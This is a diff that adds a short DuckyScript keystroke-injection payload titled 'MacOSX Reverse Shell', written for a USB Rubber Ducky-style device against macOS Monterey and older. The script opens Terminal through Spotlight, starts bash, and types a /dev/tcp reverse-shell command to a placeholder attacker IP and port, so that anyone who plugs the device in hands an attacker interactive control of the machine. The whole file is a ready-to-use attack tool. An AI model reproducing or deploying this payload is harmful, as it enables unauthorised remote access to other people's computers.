@@ -1,0 +1,20 @@
+REM Title: MacOSX Reverse Shell (v1.0)
+REM Author: fatherthomas
+REM Description: Allows you to traverse through any MacOS system and use bash commands to do what you please
+REM Target: MacOS Monterey (or older versions)
+REM Version: 1.0
+
+GUI SPACE
+DELAY 100
+STRING Terminal
+DELAY 200
+ENTER
+DELAY 900
+STRING bash
+DELAY 100
+ENTER
+DELAY 500
+STRING bash -i >& /dev/tcp/<attacker ip>/<port> 0>&1
+DELAY 200
+ENTER
+DELAY 1000
